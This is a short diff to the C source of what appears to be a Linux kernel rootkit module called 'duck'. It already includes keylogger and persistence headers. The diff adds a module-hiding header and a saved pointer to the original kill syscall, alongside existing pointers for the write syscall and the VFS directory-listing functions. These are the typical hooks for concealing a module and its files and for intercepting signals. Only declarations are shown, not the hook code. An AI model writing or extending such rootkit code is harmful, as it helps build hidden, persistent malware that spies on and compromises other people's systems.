@@ -8,6 +8,7 @@
 #include "keylogger.h"
 #include "misc.h"
 #include "persistence.h"
+#include "hide_module.h"
 #include "syscalls.h"
 #include "vfs.h"
 
@@ -19,6 +20,8 @@ module_init(duck_init);
 module_exit(duck_exit);
 
 asmlinkage ssize_t (*original_write)(int fd, const char __user *buff, ssize_t count);
+asmlinkage ssize_t (*original_kill)(pid_t pid, int sig);
+
 int (*vfs_original_iterate)(struct file *, struct dir_context *);
 int (*vfs_original_filldir)(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);
 
